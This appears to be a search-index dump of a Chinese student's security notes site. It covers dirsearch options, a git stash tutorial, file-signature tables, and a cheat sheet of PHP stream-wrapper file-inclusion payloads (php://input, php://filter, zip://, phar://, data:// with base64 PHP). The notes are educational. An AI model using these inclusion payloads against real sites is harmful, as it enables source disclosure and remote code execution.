Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0\uff0c\u53ef\u4ee5\u4f2a\u9020\u8bf7\u6c42\u62a5\u6587\n--cookie=COOKIE               \u53ef\u4ee5\u8bbe\u7f6e\u8bbf\u95eecookie\n--exit-on-error               \u5f53\u51fa\u9519\u76f4\u63a5\u5173\u95ed\u7a0b\u5e8f\n--timeout=TIMEOUT               \u8bbf\u95ee\u8d85\u65f6\u8bbe\u7f6e\n-s DELAY, --delay=DELAY               \u8bf7\u6c42\u95f4\u9694\u5ef6\u8fdf/s\uff0c\u652f\u6301\u6d6e\u70b9\u6570 Delay between requests (support float number)\n--proxy=PROXY                \u6307\u5b9a\u8bbf\u95ee\u4ee3\u7406\uff0c\u4f8b\u5982: localhost:8080, socks5://localhost:8088)\n</code></pre>"},{"location":"WEB/zhuan/dirsearch%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#_6","title":"\u8f93\u51fa\u62a5\u544a\u683c\u5f0f","text":"Text Only<pre><code>--simple-report=OUTPUTFILE               \u7b80\u6d01\u62a5\u544a\n--plain-text-report=OUTPUTFILE               \u7eaf\u6587\u672c\u683c\u5f0f\u62a5\u544a\n--json-report=OUTPUTFILE               json\u683c\u5f0f\u62a5\u544a\n--xml-report=OUTPUTFILE               xml\u683c\u5f0f\u62a5\u544a\n--markdown-report=OUTPUTFILE               markdown\u683c\u5f0f\u62a5\u544a\n</code></pre>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/","title":"git-stash \u7528\u6cd5\u5c0f\u7ed3","text":"<p>\u539f\u6587\uff1ahttps://blog.csdn.net/cllcsy/article/details/108846060</p>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#_1","title":"\u7f18\u8d77","text":"<p>\u4eca\u5929\u5728\u770b\u4e00\u4e2a bug\uff0c\u4e4b\u524d\u4e00\u4e2a\u5206\u652f\u7684\u7248\u672c\u662f\u6b63\u5e38\u7684\uff0c\u5728\u65b0\u7684\u5206\u652f\u4e0a\u4e0a\u52a0\u4e86\u5f88\u591a\u65e5\u5fd7\u6ca1\u627e\u5230\u539f\u56e0\uff0c\u5e0c\u671b\u56de\u6eaf\u5230\u4e4b\u524d\u7684\u7248\u672c\uff0c\u786e\u5b9a\u4e0b\u4ece\u54ea\u4e2a\u63d0\u4ea4\u5f15\u5165\u7684\u95ee\u9898\uff0c\u4f46\u662f\u8fd8\u4e0d\u60f3\u628a\u73b0\u5728\u7684\u4fee\u6539\u63d0\u4ea4\uff0c\u4e5f\u4e0d\u5e0c\u671b\u5728 Git \u4e0a\u770b\u5230\u5f53\u524d\u4fee\u6539\u7684\u7248\u672c\uff08\u5e26\u6709\u5927\u91cf\u65e5\u5fd7\u548c\u8c03\u8bd5\u4fe1\u606f\uff09\u3002\u56e0\u6b64\u5462\uff0c\u67e5\u67e5 Git \u6709\u6ca1\u6709\u63d0\u4f9b\u7c7b\u4f3c\u529f\u80fd\uff0c\u5c31\u627e\u5230\u4e86<code>git stash</code>\u7684\u547d\u4ee4\u3002</p> <p>\u7efc\u5408\u4e0b\u7f51\u4e0a\u7684\u4ecb\u7ecd\u548c\u8d44\u6599\uff0c<code>git stash</code>\uff08git \u50a8\u85cf\uff09\u53ef\u7528\u4e8e\u4ee5\u4e0b\u60c5\u5f62\uff1a</p> <ul> <li>\u53d1\u73b0\u6709\u4e00\u4e2a\u7c7b\u662f\u591a\u4f59\u7684\uff0c\u60f3\u5220\u6389\u5b83\u53c8\u62c5\u5fc3\u4ee5\u540e\u9700\u8981\u67e5\u770b\u5b83\u7684\u4ee3\u7801\uff0c\u60f3\u4fdd\u5b58\u5b83\u4f46\u53c8\u4e0d\u60f3\u589e\u52a0\u4e00\u4e2a\u810f\u7684\u63d0\u4ea4\u3002\u8fd9\u65f6\u5c31\u53ef\u4ee5\u8003\u8651<code>git stash</code>\u3002</li> <li>\u4f7f\u7528 git \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5f80\u5f80\u4f7f\u7528\u5206\u652f\uff08branch\uff09\u89e3\u51b3\u4efb\u52a1\u5207\u6362\u95ee\u9898\uff0c\u4f8b\u5982\uff0c\u6211\u4eec\u5f80\u5f80\u4f1a\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684\u5206\u652f\u53bb\u4fee\u6539\u548c\u8c03\u8bd5\u4ee3\u7801, \u5982\u679c\u522b\u4eba\u6216\u8005\u81ea\u5df1\u53d1\u73b0\u539f\u6709\u7684\u5206\u652f\u4e0a\u6709\u4e2a\u4e0d\u5f97\u4e0d\u4fee\u6539\u7684 bug\uff0c\u6211\u4eec\u5f80\u5f80\u4f1a\u628a\u5b8c\u6210\u4e00\u534a\u7684\u4ee3\u7801<code>commit</code>\u63d0\u4ea4\u5230\u672c\u5730\u4ed3\u5e93\uff0c\u7136\u540e\u5207\u6362\u5206\u652f\u53bb\u4fee\u6539 bug\uff0c\u6539\u597d\u4e4b\u540e\u518d\u5207\u6362\u56de\u6765\u3002\u8fd9\u6837\u7684\u8bdd\u5f80\u5f80 log \u4e0a\u4f1a\u6709\u5927\u91cf\u4e0d\u5fc5\u8981\u7684\u8bb0\u5f55\u3002\u5176\u5b9e\u5982\u679c\u6211\u4eec\u4e0d\u60f3\u63d0\u4ea4\u5b8c\u6210\u4e00\u534a\u6216\u8005\u4e0d\u5b8c\u5584\u7684\u4ee3\u7801\uff0c\u4f46\u662f\u5374\u4e0d\u5f97\u4e0d\u53bb\u4fee\u6539\u4e00\u4e2a\u7d27\u6025 Bug\uff0c\u90a3\u4e48\u4f7f\u7528<code>git stash</code>\u5c31\u53ef\u4ee5\u5c06\u4f60\u5f53\u524d\u672a\u63d0\u4ea4\u5230\u672c\u5730\uff08\u548c\u670d\u52a1\u5668\uff09\u7684\u4ee3\u7801\u63a8\u5165\u5230 Git \u7684\u6808\u4e2d\uff0c\u8fd9\u65f6\u5019\u4f60\u7684\u5de5\u4f5c\u533a\u95f4\u548c\u4e0a\u4e00\u6b21\u63d0\u4ea4\u7684\u5185\u5bb9\u662f\u5b8c\u5168\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u653e\u5fc3\u7684\u4fee Bug\uff0c\u7b49\u5230\u4fee\u5b8c Bug\uff0c\u63d0\u4ea4\u5230\u670d\u52a1\u5668\u4e0a\u540e\uff0c\u518d\u4f7f\u7528<code>git stash apply</code>\u5c06\u4ee5\u524d\u4e00\u534a\u7684\u5de5\u4f5c\u5e94\u7528\u56de\u6765\u3002</li> <li>\u7ecf\u5e38\u6709\u8fd9\u6837\u7684\u4e8b\u60c5\u53d1\u751f\uff0c\u5f53\u4f60\u6b63\u5728\u8fdb\u884c\u9879\u76ee\u4e2d\u67d0\u4e00\u90e8\u5206\u7684\u5de5\u4f5c\uff0c\u91cc\u9762\u7684\u4e1c\u897f\u5904\u4e8e\u4e00\u4e2a\u6bd4\u8f83\u6742\u4e71\u7684\u72b6\u6001\uff0c\u800c\u4f60\u60f3\u8f6c\u5230\u5176\u4ed6\u5206\u652f\u4e0a\u8fdb\u884c\u4e00\u4e9b\u5de5\u4f5c\u3002\u95ee\u9898\u662f\uff0c\u4f60\u4e0d\u60f3\u63d0\u4ea4\u8fdb\u884c\u4e86\u4e00\u534a\u7684\u5de5\u4f5c\uff0c\u5426\u5219\u4ee5\u540e\u4f60\u65e0\u6cd5\u56de\u5230\u8fd9\u4e2a\u5de5\u4f5c\u70b9\u3002\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u529e\u6cd5\u5c31\u662f<code>git stash</code>\u547d\u4ee4\u3002\u50a8\u85cf (stash) \u53ef\u4ee5\u83b7\u53d6\u4f60\u5de5\u4f5c\u76ee\u5f55\u7684\u4e2d\u95f4\u72b6\u6001\u2014\u2014\u4e5f\u5c31\u662f\u4f60\u4fee\u6539\u8fc7\u7684\u88ab\u8ffd\u8e2a\u7684\u6587\u4ef6\u548c\u6682\u5b58\u7684\u53d8\u66f4\u2014\u2014\u5e76\u5c06\u5b83\u4fdd\u5b58\u5230\u4e00\u4e2a\u672a\u5b8c\u7ed3\u53d8\u66f4\u7684\u5806\u6808\u4e2d\uff0c\u968f\u65f6\u53ef\u4ee5\u91cd\u65b0\u5e94\u7528\u3002</li> </ul>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#git-stash_1","title":"<code>git stash</code>\u7528\u6cd5","text":""},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#1-stash","title":"1. stash \u5f53\u524d\u4fee\u6539","text":"<p><code>git stash</code>\u4f1a\u628a\u6240\u6709\u672a\u63d0\u4ea4\u7684\u4fee\u6539\uff08\u5305\u62ec\u6682\u5b58\u7684\u548c\u975e\u6682\u5b58\u7684\uff09\u90fd\u4fdd\u5b58\u8d77\u6765\uff0c\u7528\u4e8e\u540e\u7eed\u6062\u590d\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u3002 \u6bd4\u5982\u4e0b\u9762\u7684\u4e2d\u95f4\u72b6\u6001\uff0c\u901a\u8fc7<code>git stash</code>\u547d\u4ee4\u63a8\u9001\u4e00\u4e2a\u65b0\u7684\u50a8\u85cf\uff0c\u5f53\u524d\u7684\u5de5\u4f5c\u76ee\u5f55\u5c31\u5e72\u51c0\u4e86\u3002</p> Text Only<pre><code>$ git status\nOn branch master\nChanges to be committed:\n\nnew file:   style.css\n\nChanges not staged for commit:\n\nmodified:   index.html\n\n$ git stash\nSaved working directory and index state WIP on master: 5002d47 our new homepage\nHEAD is now at 5002d47 our new homepage\n\n$ git status\nOn branch master\nnothing to commit, working tree clean\n</code></pre> <p>\u9700\u8981\u8bf4\u660e\u4e00\u70b9\uff0cstash \u662f\u672c\u5730\u7684\uff0c\u4e0d\u4f1a\u901a\u8fc7<code>git push</code>\u547d\u4ee4\u4e0a\u4f20\u5230 git server \u4e0a\u3002 \u5b9e\u9645\u5e94\u7528\u4e2d\u63a8\u8350\u7ed9\u6bcf\u4e2a stash \u52a0\u4e00\u4e2a message\uff0c\u7528\u4e8e\u8bb0\u5f55\u7248\u672c\uff0c\u4f7f\u7528<code>git stash save</code>\u53d6\u4ee3<code>git stash</code>\u547d\u4ee4\u3002\u793a\u4f8b\u5982\u4e0b\uff1a</p> Text Only<pre><code>$ git stash save \"test-cmd-stash\"\nSaved working directory and index state On autoswitch: test-cmd-stash\nHEAD \u73b0\u5728\u4f4d\u4e8e 296e8d4 remove unnecessary postion reset in onResume function\n$ git stash list\nstash@{0}: On autoswitch: test-cmd-stash\n</code></pre>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#2-stash","title":"2. \u91cd\u65b0\u5e94\u7528\u7f13\u5b58\u7684 stash","text":"<p>\u53ef\u4ee5\u901a\u8fc7<code>git stash pop</code>\u547d\u4ee4\u6062\u590d\u4e4b\u524d\u7f13\u5b58\u7684\u5de5\u4f5c\u76ee\u5f55\uff0c\u8f93\u51fa\u5982\u4e0b\uff1a</p> Text Only<pre><code>$ git status\nOn branch master\nnothing to commit, working tree clean\n$ git stash pop\nOn branch master\nChanges to be committed:\n\n    new file:   style.css\n\nChanges not staged for commit:\n\n    modified:   index.html\n\nDropped refs/stash@{0} (32b3aa1d185dfe6d57b3c3cc3b32cbf3e380cc6a)\n</code></pre> <p>\u8fd9\u4e2a\u6307\u4ee4\u5c06\u7f13\u5b58\u5806\u6808\u4e2d\u7684\u7b2c\u4e00\u4e2a stash \u5220\u9664\uff0c\u5e76\u5c06\u5bf9\u5e94\u4fee\u6539\u5e94\u7528\u5230\u5f53\u524d\u7684\u5de5\u4f5c\u76ee\u5f55\u4e0b\u3002 \u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528<code>git stash apply</code>\u547d\u4ee4\uff0c\u5c06\u7f13\u5b58\u5806\u6808\u4e2d\u7684 stash \u591a\u6b21\u5e94\u7528\u5230\u5de5\u4f5c\u76ee\u5f55\u4e2d\uff0c\u4f46\u5e76\u4e0d\u5220\u9664 stash \u62f7\u8d1d\u3002\u547d\u4ee4\u8f93\u51fa\u5982\u4e0b\uff1a</p> Text Only<pre><code>$ git stash apply\nOn branch master\nChanges to be committed:\n\n    new file:   style.css\n\nChanges not staged for commit:\n\n    modified:   index.html\n</code></pre>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#3-stash","title":"3. \u67e5\u770b\u73b0\u6709 stash","text":"<p>\u53ef\u4ee5\u4f7f\u7528<code>git stash list</code>\u547d\u4ee4\uff0c\u4e00\u4e2a\u5178\u578b\u7684\u8f93\u51fa\u5982\u4e0b\uff1a</p> Text Only<pre><code>$ git stash list\nstash@{0}: WIP on master: 049d078 added the index file\nstash@{1}: WIP on master: c264051 Revert \"added file_size\"\nstash@{2}: WIP on master: 21d80a5 added number to log\n</code></pre> <p>\u5728\u4f7f\u7528<code>git stash apply</code>\u547d\u4ee4\u65f6\u53ef\u4ee5\u901a\u8fc7\u540d\u5b57\u6307\u5b9a\u4f7f\u7528\u54ea\u4e2a stash\uff0c\u9ed8\u8ba4\u4f7f\u7528\u6700\u8fd1\u7684 stash\uff08\u5373 stash@{0}\uff09\u3002</p>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#4-stash","title":"4. \u79fb\u9664 stash","text":"<p>\u53ef\u4ee5\u4f7f\u7528<code>git stash drop</code>\u547d\u4ee4\uff0c\u540e\u9762\u53ef\u4ee5\u8ddf\u7740 stash \u540d\u5b57\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\uff1a</p> Text Only<pre><code>$ git stash list\nstash@{0}: WIP on master: 049d078 added the index file\nstash@{1}: WIP on master: c264051 Revert \"added file_size\"\nstash@{2}: WIP on master: 21d80a5 added number to log\n$ git stash drop stash@{0}\nDropped stash@{0} (364e91f3f268f0900bc3ee613f9f733e82aaed43)\n</code></pre> <p>\u6216\u8005\u4f7f\u7528<code>git stash clear</code>\u547d\u4ee4\uff0c\u5220\u9664\u6240\u6709\u7f13\u5b58\u7684 stash\u3002</p>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#5-stash-diff","title":"5. \u67e5\u770b\u6307\u5b9a stash \u7684 diff","text":"<p>\u53ef\u4ee5\u4f7f\u7528<code>git stash show</code>\u547d\u4ee4\uff0c\u540e\u9762\u53ef\u4ee5\u8ddf\u7740 stash \u540d\u5b57\u3002\u793a\u4f8b\u5982\u4e0b\uff1a</p> Text Only<pre><code>$ git stash show\n index.html | 1 +\n style.css | 3 +++\n 2 files changed, 4 insertions(+)\n</code></pre> <p>\u5728\u8be5\u547d\u4ee4\u540e\u9762\u6dfb\u52a0<code>-p</code>\u6216<code>--patch</code>\u53ef\u4ee5\u67e5\u770b\u7279\u5b9a stash \u7684\u5168\u90e8 diff\uff0c\u5982\u4e0b\uff1a</p> Text Only<pre><code>$ git stash show -p\ndiff --git a/style.css b/style.css\nnew file mode 100644\nindex 0000000..d92368b\n--- /dev/null\n+++ b/style.css\n@@ -0,0 +1,3 @@\n+* {\n+  text-decoration: blink;\n+}\ndiff --git a/index.html b/index.html\nindex 9daeafb..ebdcbd2 100644\n--- a/index.html\n+++ b/index.html\n@@ -1 +1,2 @@\n+&lt;link rel=\"stylesheet\" href=\"style.css\"/&gt;\n</code></pre>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#6-stash","title":"6. \u4ece stash \u521b\u5efa\u5206\u652f","text":"<p>\u5982\u679c\u4f60\u50a8\u85cf\u4e86\u4e00\u4e9b\u5de5\u4f5c\uff0c\u6682\u65f6\u4e0d\u53bb\u7406\u4f1a\uff0c\u7136\u540e\u7ee7\u7eed\u5728\u4f60\u50a8\u85cf\u5de5\u4f5c\u7684\u5206\u652f\u4e0a\u5de5\u4f5c\uff0c\u4f60\u5728\u91cd\u65b0\u5e94\u7528\u5de5\u4f5c\u65f6\u53ef\u80fd\u4f1a\u78b0\u5230\u4e00\u4e9b\u95ee\u9898\u3002\u5982\u679c\u5c1d\u8bd5\u5e94\u7528\u7684\u53d8\u66f4\u662f\u9488\u5bf9\u4e00\u4e2a\u4f60\u90a3\u4e4b\u540e\u4fee\u6539\u8fc7\u7684\u6587\u4ef6\uff0c\u4f60\u4f1a\u78b0\u5230\u4e00\u4e2a\u5f52\u5e76\u51b2\u7a81\u5e76\u4e14\u5fc5\u987b\u53bb\u5316\u89e3\u5b83\u3002\u5982\u679c\u4f60\u60f3\u7528\u66f4\u65b9\u4fbf\u7684\u65b9\u6cd5\u6765\u91cd\u65b0\u68c0\u9a8c\u4f60\u50a8\u85cf\u7684\u53d8\u66f4\uff0c\u4f60\u53ef\u4ee5\u8fd0\u884c git stash branch\uff0c\u8fd9\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5206\u652f\uff0c\u68c0\u51fa\u4f60\u50a8\u85cf\u5de5\u4f5c\u65f6\u7684\u6240\u5904\u7684\u63d0\u4ea4\uff0c\u91cd\u65b0\u5e94\u7528\u4f60\u7684\u5de5\u4f5c\uff0c\u5982\u679c\u6210\u529f\uff0c\u5c06\u4f1a\u4e22\u5f03\u50a8\u85cf\u3002</p> Text Only<pre><code>$ git stash branch testchanges\nSwitched to a new branch \"testchanges\"\n# On branch testchanges\n# Changes to be committed:\n#   (use \"git reset HEAD &lt;file&gt;...\" to unstage)\n#\n#      modified:   index.html\n#\n# Changes not staged for commit:\n#   (use \"git add &lt;file&gt;...\" to update what will be committed)\n#\n#      modified:   lib/simplegit.rb\n#\nDropped refs/stash@{0} (f0dfc4d5dc332d1cee34a634182e168c4efc3359)\n</code></pre> <p>\u8fd9\u662f\u4e00\u4e2a\u5f88\u68d2\u7684\u6377\u5f84\u6765\u6062\u590d\u50a8\u85cf\u7684\u5de5\u4f5c\u7136\u540e\u5728\u65b0\u7684\u5206\u652f\u4e0a\u7ee7\u7eed\u5f53\u65f6\u7684\u5de5\u4f5c\u3002</p>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#7","title":"7. \u6682\u5b58\u672a\u8ddf\u8e2a\u6216\u5ffd\u7565\u7684\u6587\u4ef6","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>git stash</code>\u4f1a\u7f13\u5b58\u4e0b\u5217\u6587\u4ef6\uff1a</p> <ul> <li>\u6dfb\u52a0\u5230\u6682\u5b58\u533a\u7684\u4fee\u6539\uff08staged changes\uff09</li> <li>Git \u8ddf\u8e2a\u7684\u4f46\u5e76\u672a\u6dfb\u52a0\u5230\u6682\u5b58\u533a\u7684\u4fee\u6539\uff08unstaged changes\uff09</li> </ul> <p>\u4f46\u4e0d\u4f1a\u7f13\u5b58\u4e00\u4e0b\u6587\u4ef6\uff1a</p> <ul> <li>\u5728\u5de5\u4f5c\u76ee\u5f55\u4e2d\u65b0\u7684\u6587\u4ef6\uff08untracked files\uff09</li> <li>\u88ab\u5ffd\u7565\u7684\u6587\u4ef6\uff08ignored files\uff09</li> </ul> <p><code>git stash</code>\u547d\u4ee4\u63d0\u4f9b\u4e86\u53c2\u6570\u7528\u4e8e\u7f13\u5b58\u4e0a\u9762\u4e24\u79cd\u7c7b\u578b\u7684\u6587\u4ef6\u3002\u4f7f\u7528<code>-u</code>\u6216\u8005<code>--include-untracked</code>\u53ef\u4ee5 stash untracked \u6587\u4ef6\u3002\u4f7f\u7528<code>-a</code>\u6216\u8005<code>--all</code>\u547d\u4ee4\u53ef\u4ee5 stash \u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u4fee\u6539\u3002</p> <p>\u81f3\u4e8e<code>git stash</code>\u7684\u5176\u4ed6\u547d\u4ee4\u5efa\u8bae\u53c2\u8003 Git manual\u3002</p>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#_2","title":"\u5c0f\u7ed3","text":"<p>git \u63d0\u4f9b\u7684\u5de5\u5177\u5f88\u591a\uff0c\u6070\u597d\u7528\u5230\u5c31\u53ef\u4ee5\u6df1\u5165\u4e86\u89e3\u4e0b\u3002\u66f4\u65b9\u4fbf\u7684\u5f00\u53d1\u4e0e\u5de5\u4f5c\u7684\u3002</p>"},{"location":"WEB/zhuan/git-stash%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93/#_3","title":"\u53c2\u8003\u8d44\u6599","text":"<ol> <li>6.3 Git \u5de5\u5177 - \u50a8\u85cf\uff08Stashing\uff09</li> <li>Git Stash \u5386\u9669\u8bb0</li> <li>Git Stash \u7528\u6cd5</li> <li>Git Stash</li> </ol>"},{"location":"WEB/zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/","title":"\u5e38\u89c1\u7684 php \u4f2a\u534f\u8bae","text":"<p>\u539f\u6587\u5730\u5740 blog.csdn.net</p>"},{"location":"WEB/zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/#1phpinput","title":"1\u3001php://input","text":"<p>\u53ef\u4ee5\u83b7\u53d6 POST \u7684\u6570\u636e\u6d41</p> PHP<pre><code>\u6761\u4ef6\uff1a\nallow_url_include=On\nallow_url_fopen-Off/On\n\nPOC:\nfile =php://input\nPOST:phpinfo();\n</code></pre>"},{"location":"WEB/zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/#2phpfilter","title":"2\u3001php://filter","text":"<p>\u53ef\u4ee5\u83b7\u53d6\u6307\u5b9a\u6587\u4ef6\u7684\u6e90\u7801\uff0c\u4f46\u662f\u5f53\u4ed6\u4e0e\u5305\u542b\u51fd\u6570\u7ed3\u5408\u662f\uff0cphp://filter \u6d41\u4f1a\u88ab\u5f53\u505a php \u6587\u4ef6\u6267\u884c \u3002\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u5bf9\u5176\u8fdb\u884c\u7f16\u7801\uff0c\u8ba9\u5176\u4e0d\u6267\u884c\u3002\u4ece\u800c\u5bfc\u81f4 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6</p> PHP<pre><code>\u6761\u4ef6\uff1a\nallow_url_fopen=Off/On\nallow_url_include=Off/On\n\n\nPOC:\n?file=php://filter/read=convert.base64-encode/resource=phpinfo.php\n</code></pre>"},{"location":"WEB/zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/#3zip","title":"3\u3001zip://","text":"<p>\u53ef\u4ee5\u8bbf\u95ee\u538b\u7f29\u5305\u91cc\u7684\u6587\u4ef6\u3002\u5f53\u4ed6\u4e0e\u5305\u542b\u51fd\u6570\u7ed3\u5408\u65f6\uff0czip:// \u6d41\u4f1a\u88ab\u5f53\u505a php \u6587\u4ef6\u6267\u884c\u3002 \u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u6267\u884c\u3002 \u540c\u7c7b\u578b\u7684\u8fd8\u6709\uff1azlib:// \u548c bzip2://</p> PHP<pre><code>\u6761\u4ef6\uff1a\n\u5fc5\u987b\u8981zip\u538b\u7f29\u5305\uff08\u540e\u7f00\u65e0\u6240\u8c13\uff0c\u6587\u4ef6\u683c\u5f0f\u662fzip\u5c31\u884c\uff09\u3002\nallow_url_fopen=Off/On\nallow_url_include=Off/On\nphp &gt;=5.2\n\nPOC:\nzip://[\u538b\u7f29\u5305\u7edd\u5bf9\u8def\u5f84]#[\u538b\u7f29\u5305\u5185\u7684\u6587\u4ef6]\n?file=zip://D:\\zip.zip%23phpinfo.txt\n</code></pre>"},{"location":"WEB/zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/#4phar","title":"4\u3001phar://","text":"<p>\u548c zip:// \u7c7b\u4f3c \u7edd\u5bf9\u8def\u5f84\u548c\u76f8\u5bf9\u8def\u5f84\u90fd\u53ef\u4ee5</p> PHP<pre><code>\u6761\u4ef6\uff1a\n\u5fc5\u987b\u8981zip\u538b\u7f29\u5305\uff08\u540e\u7f00\u65e0\u6240\u8c13\uff0c\u6587\u4ef6\u683c\u5f0f\u662fzip\u5c31\u884c\uff09\u3002\nallow_url_fopen=Off/On\nallow_url_include=Off/On\nphp &gt;=5.2\n\n\nPOC:\nzip://[\u538b\u7f29\u5305\u7edd\u5bf9\u8def\u5f84]#[\u538b\u7f29\u5305\u5185\u7684\u6587\u4ef6]\n?file=zip://D:\\zip.zip/phpinfo.php(\u4e0ezip://\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u4e00\u4e2a\u662f# \uff0c\u4e00\u4e2a\u662f/)\n</code></pre>"},{"location":"WEB/zhuan/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/#5data","title":"5\u3001data://","text":"<p>\u540c\u6837\u7c7b\u4f3c\u4e8e php://input</p> PHP<pre><code>\u6761\u4ef6\uff1a\nallow_url_fopen=On\nallow_url_include=On\n\n\nPOC:\n?file=data://,&lt;?php phpinfo();\n?file=data://text/plain,&lt;php phpinfo();\n?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n?file=data:text/plain,&lt;php phpinfo();\n?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n</code></pre>"},{"location":"WEB/zhuan/%E6%96%87%E4%BB%B6%E5%A4%B4/","title":"\u6587\u4ef6\u5934\u3001\u5c3e\u603b\u7ed3","text":"<p>\u539f\u6587\u5730\u5740\uff1a[\u5e38\u89c1\u6587\u4ef6\u5934\uff0c\u6587\u4ef6\u5c3e\u603b\u7ed3]</p>"},{"location":"WEB/zhuan/%E6%96%87%E4%BB%B6%E5%A4%B4/#_2","title":"\u56fe\u7247\u7c7b","text":"\u6587\u4ef6\u7c7b\u578b \u540e\u7f00 \u6587\u4ef6\u5934 \u6587\u4ef6\u5c3e \u6807\u5fd7 JPEG .jpg/.jpeg FFD8FF FFD9 JFIF PNG .png 89504E47 AE426082 PNG IEND IHDR GIF .gif 47494638 003B GIT9a\uff08GIF89a\uff09 TIFF .tif/.tiff 49492A00 4D4D2A00 - II MM"},{"location":"WEB/zhuan/%E6%96%87%E4%BB%B6%E5%A4%B4/#_3","title":"\u97f3\u9891\u7c7b","text":"\u6587\u4ef6\u7c7b\u578b \u540e\u7f00 \u6587\u4ef6\u5934 \u6587\u4ef6\u5c3e \u6807\u5fd7 WAVE .wav 52494646 - RIFF"},{"location":"WEB/zhuan/%E6%96%87%E4%BB%B6%E5%A4%B4/#_4","title":"\u538b\u7f29\u6587\u4ef6\u7c7b","text":"\u6587\u4ef6\u7c7b\u578b \u540e\u7f00 \u6587\u4ef6\u5934 \u6587\u4ef6\u5c3e \u6807\u5fd7 ZIP Archive .zip 504B0304 - PK RAR Archive .rar 52617221 - RAR! 7Z Archive .7z 377ABCAF - 7z"},{"location":"WEB/zhuan/%E6%96%87%E4%BB%B6%E5%A4%B4/#_5","title":"\u6587\u672c\u6587\u6863\u7c7b","text":"\u6587\u4ef6\u7c7b\u578b \u540e\u7f00 \u6587\u4ef6\u5934 \u6587\u4ef6\u5c3e \u6807\u5fd7 XML .xml 3C3F786D6C - - HTML .html 68746D6C3E - - Adobe PDF .pdf 255044462D312E - %PDF %%EOF"},{"location":"WEBSITE/","title":"\u4f60\u597d","text":"<p>\u8fd9\u91cc\u662f\u4faf\u9716\u94b0\u7684\u4e2a\u4eba\u7f51\u7ad9 https://AnistonH.github.io</p> <ul> <li> <p>\u901a\u8fc7\u4e3b\u9898\u548c\u76ee\u5f55\u4ee5\u6253\u5f00\u6587\u7ae0</p> <ul> <li>\u5efa\u8bae\u4f7f\u7528 PC \u8bbf\u95ee\u8be5\u7f51\u7ad9</li> <li>PC\u7aef \u5728\u4e0a\u65b9\u6807\u7b7e\u680f\u9009\u62e9\u4e3b\u9898 \u5728\u5de6\u4fa7\u76ee\u5f55\u9009\u62e9\u6587\u7ae0</li> <li>\u79fb\u52a8\u7aef \u70b9\u51fb\u5de6\u4e0a\u89d2\u56fe\u6807\u9009\u62e9\u4e3b\u9898\u548c\u6587\u7ae0</li> </ul> </li> <li> <p>\u641c\u7d22\u5173\u952e\u8bcd\u4ee5\u6253\u5f00\u6587\u7ae0</p> </li> <li> <p>\u6587\u7ae0\u5185\u90e8\u76ee\u5f55\u8bf4\u660e\uff1a</p> <ul> <li>PC\u7aef \u53f3\u4fa7\u680f\u4e3a\u6587\u7ae0\u5185\u90e8\u76ee\u5f55</li> <li>\u79fb\u52a8\u7aef \u70b9\u51fb\u5de6\u4e0a\u89d2\u56fe\u6807\uff0c\u518d\u70b9\u51fb\u6b64\u65f6\u5bf9\u5e94\u6587\u7ae0\u53f3\u4fa7\u7684\u56fe\u6807</li> </ul> </li> </ul> <p>\u66f4\u65b0\u4e8e 2024-09-20</p>"},{"location":"WEBSITE/#_2","title":"\u4e2a\u4eba\u73b0\u72b6","text":"<ul> <li>(2023.9 - 2027.6) \u4e2d\u5317\u5927\u5b66\u4e0e\u4e2d\u5317\u5927\u5b66-\u7f51\u7edc\u884c\u4e3a\u5206\u6790\u5b9e\u9a8c\u5ba4<ul> <li>\u4e3b\u8981\u5b66\u4e60\u65b9\u5411\uff1a<ul> <li>\u8f6f\u4ef6\u5de5\u7a0b</li> <li>\u7f51\u7edc\u5b89\u5168</li> </ul> </li> </ul> </li> </ul>"},{"location":"WEBSITE/#_3","title":"\u4e2a\u4eba\u4fe1\u606f","text":"<p>\u66f4\u591a\u4fe1\u606f\u8bf7\u67e5\u770b 